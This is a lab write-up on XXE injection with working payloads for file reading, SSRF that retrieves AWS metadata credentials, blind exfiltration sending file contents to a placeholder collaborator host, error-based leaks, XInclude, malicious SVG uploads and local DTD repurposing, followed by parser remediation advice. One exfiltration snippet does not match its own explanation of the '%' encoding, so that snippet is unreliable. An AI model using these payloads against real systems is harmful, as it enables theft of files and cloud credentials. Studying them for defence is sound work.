# XXE Injection

## What is XXE

XXE (XML External Entity) injection targets XML parsers that have external entity processing enabled. When an application accepts XML input and the parser supports external entities, you can define a custom entity pointing to a local file, internal URL, or external server and the parser resolves it before the application processes the data.

The basic syntax:

```xml

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
&xxe;1
```

The parser substitutes `&xxe;` with the contents of `/etc/passwd` before the application sees the value. Most parsers support external entities by default because it is part of the XML specification — the vulnerability is a misconfiguration, not a bug.

## Labs completed

- Exploiting XXE using external entities to retrieve files (Apprentice)
- Exploiting XXE to perform SSRF attacks (Apprentice)
- Blind XXE with out-of-band interaction (Practitioner)
- Blind XXE with out-of-band interaction via XML parameter entities (Practitioner)
- Exploiting blind XXE to exfiltrate data using a malicious external DTD (Practitioner)
- Exploiting blind XXE to retrieve data via error messages (Practitioner)
- Exploiting XInclude to retrieve files (Practitioner)
- Exploiting XXE via image file upload (Practitioner)
- Exploiting XXE to retrieve data by repurposing a local DTD (Expert)

## Attack vectors

**File read** is the simplest case. Define an external entity pointing to a local file and reference it inside an element the application reflects in the response. The file contents appear in the response body or error message.

**SSRF via XXE** works by pointing the entity at an internal URL instead of a file path. In the lab this meant hitting the AWS metadata endpoint:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

The parser fetches the URL and returns the response as the entity value. The server walked the metadata path step by step, eventually returning AWS credentials including AccessKeyId, SecretAccessKey, and Token.

**Blind XXE with out-of-band interaction** is used when the application does not reflect entity values in responses. You point the entity at your Burp Collaborator URL. If the parser processes it, the server makes a DNS lookup and HTTP request to your host, confirming the vulnerability even with no visible output.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-URL"> ]>
```

Parameter entities work only inside DTD declarations and are useful when regular entities are blocked:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-URL"> %xxe; ]>
```

**Blind XXE with malicious external DTD** is used when you need to exfiltrate actual data. You host a DTD on an exploit server containing nested parameter entities — one reads the target file, another constructs a URL with the file contents as a query parameter:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://YOUR-COLLABORATOR-URL/?x=%file;'>">
%eval;
%exfil;
```

The `&#x25;` is a double-encoded `%` required to avoid parser errors when defining nested entities inside a DTD. The server fetches your DTD, executes it, and sends the file contents to Collaborator as a query parameter.

**Blind XXE via error messages** is an alternative when you can observe error responses. You read a file and then try to open a nonexistent path using the file contents as part of the path. The parser throws a FileNotFoundException that includes the file contents in the error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**XInclude** is used when you do not control the full XML document and your input is embedded inside XML the server constructs. You cannot add a DOCTYPE, so you inject an `xi:include` element instead:
productId=<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>

The `parse="text"` attribute is required — without it the parser tries to interpret the included file as XML and throws an error.

**XXE via file upload** exploits applications that accept SVG files, which are processed as XML on the server side. You craft a malicious SVG with a DOCTYPE and entity pointing to a local file:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload it as an avatar. The server renders it using Apache Batik, resolves the entity, and writes the file contents into the image as visible text.

**Repurposing a local DTD** is the most advanced technique, used when the server blocks all external connections. You reference a DTD that already exists on the server filesystem and redefine one of its entities to contain your payload. Systems with GNOME often have `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`:

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
]>
```

The local DTD is loaded, your redefined entity executes inside it, and the error-based exfiltration chain runs entirely using local resources.

## Remediation

Disable external entity processing in the parser configuration. In Java set `XMLConstants.FEATURE_SECURE_PROCESSING` or explicitly disable `FEATURE_EXTERNAL_GENERAL_ENTITIES`. In Python's lxml pass `resolve_entities=False`. Most modern frameworks disable this by default, but legacy codebases and third-party libraries remain a common source of exposure.
